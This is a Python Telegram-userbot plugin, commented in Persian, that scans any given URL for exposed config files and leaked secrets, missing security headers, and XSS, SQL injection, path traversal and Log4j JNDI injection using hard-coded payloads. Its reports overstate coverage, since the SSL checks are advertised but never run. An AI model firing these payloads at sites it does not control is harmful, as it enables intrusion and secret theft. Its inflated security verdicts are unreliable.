# plugins/vulnassessment.py

from telethon import events
from client import client
import aiohttp
import urllib.parse
import re
import asyncio
import json
from typing import List, Dict, Optional

class VulnerabilityAssessment:
    def __init__(self):
        self.vulnerabilities = []
        self.session = None
        
        # تست‌های مختلف آسیب‌پذیری
        self.tests = {
            'information_disclosure': {
                'paths': [
                    '/.env', '/config.php', '/wp-config.php', '/.git/config',
                    '/admin/', '/phpmyadmin/', '/adminer.php', '/backup/',
                    '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config',
                    '/server-status', '/server-info', '/phpinfo.php'
                ],
                'severity': 'medium'
            },
            'security_headers': {
                'headers': [
                    'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
                    'Strict-Transport-Security', 'Content-Security-Policy',
                    'Referrer-Policy', 'Permissions-Policy'
                ],
                'severity': 'low'
            },
            'ssl_security': {
                'checks': ['ssl_version', 'cipher_strength', 'certificate_validity'],
                'severity': 'high'
            },
            'common_vulnerabilities': {
                'payloads': [
                    {'param': 'test', 'payload': '<script>alert(1)</script>', 'type': 'xss'},
                    {'param': 'test', 'payload': "' OR '1'='1", 'type': 'sqli'},
                    {'param': 'test', 'payload': '../../../etc/passwd', 'type': 'lfi'},
                    {'param': 'test', 'payload': '${jndi:ldap://test.com/a}', 'type': 'log4j'}
                ],
                'severity': 'critical'
            }
        }
    
    async def test_information_disclosure(self, base_url: str) -> List[Dict]:
        """تست افشای اطلاعات"""
        findings = []
        
        for path in self.tests['information_disclosure']['paths']:
            try:
                test_url = urllib.parse.urljoin(base_url, path)
                
                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # بررسی محتوای حساس
                        sensitive_patterns = [
                            r'password\s*[=:]\s*["\']?([^"\'\s]+)',
                            r'api[_-]?key\s*[=:]\s*["\']?([^"\'\s]+)',
                            r'secret\s*[=:]\s*["\']?([^"\'\s]+)',
                            r'token\s*[=:]\s*["\']?([^"\'\s]+)',
                            r'database\s*[=:]\s*["\']?([^"\'\s]+)'
                        ]
                        
                        for pattern in sensitive_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                findings.append({
                                    'type': 'information_disclosure',
                                    'url': test_url,
                                    'severity': 'high',
                                    'description': f'Sensitive information exposed in {path}',
                                    'evidence': f'Found {len(matches)} sensitive patterns'
                                })
                                break
                        else:
                            # اگر فایل در دسترس است اما حساس نیست
                            findings.append({
                                'type': 'information_disclosure',
                                'url': test_url,
                                'severity': 'medium',
                                'description': f'File accessible: {path}',
                                'evidence': f'HTTP {resp.status}, Size: {len(content)} bytes'
                            })
                            
            except Exception:
                continue
                
        return findings
    
    async def test_security_headers(self, url: str) -> List[Dict]:
        """تست security headers"""
        findings = []
        
        try:
            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                headers = dict(resp.headers)
                
                missing_headers = []
                weak_headers = []
                
                # بررسی وجود headerهای امنیتی
                for header in self.tests['security_headers']['headers']:
                    if header not in headers:
                        missing_headers.append(header)
                    else:
                        # بررسی قدرت header
                        value = headers[header].lower()
                        if header == 'X-Frame-Options' and value not in ['deny', 'sameorigin']:
                            weak_headers.append(f'{header}: {value}')
                        elif header == 'X-XSS-Protection' and '1; mode=block' not in value:
                            weak_headers.append(f'{header}: {value}')
                
                if missing_headers:
                    findings.append({
                        'type': 'missing_security_headers',
                        'url': url,
                        'severity': 'medium',
                        'description': 'Missing security headers',
                        'evidence': f'Missing: {", ".join(missing_headers)}'
                    })
                
                if weak_headers:
                    findings.append({
                        'type': 'weak_security_headers',
                        'url': url,
                        'severity': 'low',
                        'description': 'Weak security headers configuration',
                        'evidence': f'Weak: {", ".join(weak_headers)}'
                    })
                    
        except Exception:
            pass
            
        return findings
    
    async def test_common_vulnerabilities(self, url: str) -> List[Dict]:
        """تست آسیب‌پذیری‌های رایج"""
        findings = []
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return findings
        
        for param_name in params.keys():
            for test_case in self.tests['common_vulnerabilities']['payloads']:
                try:
                    # ساخت URL تست
                    test_params = params.copy()
                    test_params[param_name] = [test_case['payload']]
                    query_string = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                    
                    async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        content = await resp.text()
                        
                        # بررسی نشانه‌های آسیب‌پذیری
                        if self._check_vulnerability(content, test_case['type'], test_case['payload']):
                            findings.append({
                                'type': test_case['type'],
                                'url': test_url,
                                'severity': 'high',
                                'description': f'{test_case["type"].upper()} vulnerability detected',
                                'evidence': f'Parameter: {param_name}, Payload: {test_case["payload"][:50]}'
                            })
                            
                except Exception:
                    continue
                    
        return findings
    
    def _check_vulnerability(self, content: str, vuln_type: str, payload: str) -> bool:
        """بررسی نشانه‌های آسیب‌پذیری"""
        content_lower = content.lower()
        
        if vuln_type == 'xss':
            return payload in content or '<script>' in content_lower
        elif vuln_type == 'sqli':
            sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']
            return any(error in content_lower for error in sql_errors)
        elif vuln_type == 'lfi':
            lfi_indicators = ['root:x:0:0:', '/bin/bash', '/bin/sh']
            return any(indicator in content for indicator in lfi_indicators)
        elif vuln_type == 'log4j':
            return 'jndi' in content_lower or 'ldap' in content_lower
        
        return False
    
    async def comprehensive_scan(self, url: str) -> Dict:
        """اسکن جامع آسیب‌پذیری"""
        all_findings = []
        
        # تست‌های مختلف
        info_disclosure = await self.test_information_disclosure(url)
        all_findings.extend(info_disclosure)
        
        security_headers = await self.test_security_headers(url)
        all_findings.extend(security_headers)
        
        common_vulns = await self.test_common_vulnerabilities(url)
        all_findings.extend(common_vulns)
        
        # تجزیه و تحلیل نتایج
        severity_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        vuln_types = {}
        
        for finding in all_findings:
            severity = finding['severity']
            vuln_type = finding['type']
            
            severity_count[severity] += 1
            
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = 0
            vuln_types[vuln_type] += 1
        
        # محاسبه امتیاز ریسک
        risk_score = (severity_count['critical'] * 4 + 
                     severity_count['high'] * 3 + 
                     severity_count['medium'] * 2 + 
                     severity_count['low'] * 1)
        
        return {
            'findings': all_findings,
            'severity_count': severity_count,
            'vuln_types': vuln_types,
            'risk_score': risk_score,
            'total_issues': len(all_findings)
        }

@client.on(events.NewMessage(pattern=r"\.vulnscan(?:\s+(.+))?", outgoing=True))
async def vulnerability_assessment(event):
    url_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()

    if not url_input and reply:
        url_input = reply.message.strip()

    if not url_input:
        await event.reply("""
🛡️ **Vulnerability Assessment Tool**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**استفاده:**
`.vulnscan https://example.com`
`.vulnscan http://target.com/page.php?id=1`

**تست‌های انجام شده:**
🔴 **Information Disclosure** - افشای اطلاعات حساس
🟠 **Security Headers** - headerهای امنیتی
🟡 **Common Vulnerabilities** - آسیب‌پذیری‌های رایج
🔵 **SSL Security** - امنیت گواهینامه

**آسیب‌پذیری‌های تست شده:**
• XSS (Cross-Site Scripting)
• SQL Injection
• Local File Inclusion (LFI)
• Log4j Vulnerability
• Configuration Files Exposure
• Admin Panel Discovery
• Backup Files Detection

**گزارش شامل:**
• سطح خطر هر آسیب‌پذیری
• مدارک و شواهد
• توصیه‌های رفع مشکل
• امتیاز کلی ریسک
• اولویت‌بندی اقدامات

⚠️ **هشدار:** فقط برای تست سایت‌های خودتان!
        """.strip())
        return

    await event.edit("🛡️ شروع ارزیابی جامع آسیب‌پذیری...")

    try:
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'https://' + url_input

        assessment = VulnerabilityAssessment()
        
        async with aiohttp.ClientSession() as session:
            assessment.session = session
            
            await event.edit("🔍 تست افشای اطلاعات...")
            await asyncio.sleep(1)
            
            await event.edit("🔒 بررسی security headers...")
            await asyncio.sleep(1)
            
            await event.edit("⚠️ تست آسیب‌پذیری‌های رایج...")
            await asyncio.sleep(1)
            
            # اجرای اسکن جامع
            results = await assessment.comprehensive_scan(url_input)

        await event.edit("📊 تجزیه و تحلیل نهایی...")
        
        parsed_url = urllib.parse.urlparse(url_input)
        
        if results['total_issues'] > 0:
            # ساخت خلاصه آسیب‌پذیری‌ها
            severity_summary = []
            severity_icons = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢'}
            
            for severity, count in results['severity_count'].items():
                if count > 0:
                    icon = severity_icons[severity]
                    severity_summary.append(f"  {icon} **{severity.title()}:** {count}")
            
            # نمایش مهم‌ترین آسیب‌پذیری‌ها
            critical_findings = [f for f in results['findings'] if f['severity'] in ['critical', 'high']][:5]
            findings_list = []
            
            for i, finding in enumerate(critical_findings):
                icon = severity_icons[finding['severity']]
                findings_list.append(f"  {i+1}. {icon} **{finding['type'].replace('_', ' ').title()}**")
                findings_list.append(f"     📍 {finding['description']}")
                findings_list.append(f"     🔍 {finding['evidence']}")
            
            # تعیین سطح خطر کلی
            risk_score = results['risk_score']
            if risk_score >= 15:
                risk_level = "🔴 بحرانی"
                risk_color = "🔴"
            elif risk_score >= 10:
                risk_level = "🟠 بالا"
                risk_color = "🟠"
            elif risk_score >= 5:
                risk_level = "🟡 متوسط"
                risk_color = "🟡"
            else:
                risk_level = "🟢 پایین"
                risk_color = "🟢"
            
            msg = f"""
{risk_color} **گزارش ارزیابی آسیب‌پذیری**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
⚠️ **مسائل یافت شده:** {results['total_issues']}
📊 **امتیاز ریسک:** {risk_score}/20
🚨 **سطح خطر کلی:** {risk_level}

📈 **توزیع شدت:**
{chr(10).join(severity_summary)}

🔍 **آسیب‌پذیری‌های مهم:**
{chr(10).join(findings_list) if findings_list else "  ✅ آسیب‌پذیری بحرانی یافت نشد"}

📋 **انواع مسائل یافت شده:**
{chr(10).join([f"  • **{vtype.replace('_', ' ').title()}:** {count} مورد" for vtype, count in results['vuln_types'].items()])}

💡 **اقدامات فوری:**
  🔴 رفع آسیب‌پذیری‌های Critical/High
  🟡 پیکربندی Security Headers
  🔒 بررسی دسترسی فایل‌های حساس
  📝 به‌روزرسانی نرم‌افزارها

⚠️ **هشدار امنیتی:** فوری اقدام به رفع مسائل یافت شده کنید!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """.strip()
        else:
            msg = f"""
🟢 **گزارش ارزیابی آسیب‌پذیری**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
✅ **نتیجه:** هیچ آسیب‌پذیری مهمی یافت نشد
📊 **امتیاز ریسک:** 0/20
🚨 **سطح خطر:** 🟢 امن

📈 **تست‌های انجام شده:**
  ✅ **Information Disclosure:** بررسی شد
  ✅ **Security Headers:** بررسی شد
  ✅ **Common Vulnerabilities:** بررسی شد
  ✅ **Configuration Files:** بررسی شد

🛡️ **وضعیت امنیت:**
  • هیچ فایل حساسی در دسترس نیست
  • Security headers مناسب پیکربندی شده
  • آسیب‌پذیری‌های رایج یافت نشد

✅ **سایت از نظر امنیتی وضعیت مناسبی دارد**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """.strip()

        await event.edit(msg)

    except Exception as e:
        await event.edit(f"⚠️ خطا در ارزیابی آسیب‌پذیری: {str(e)}")
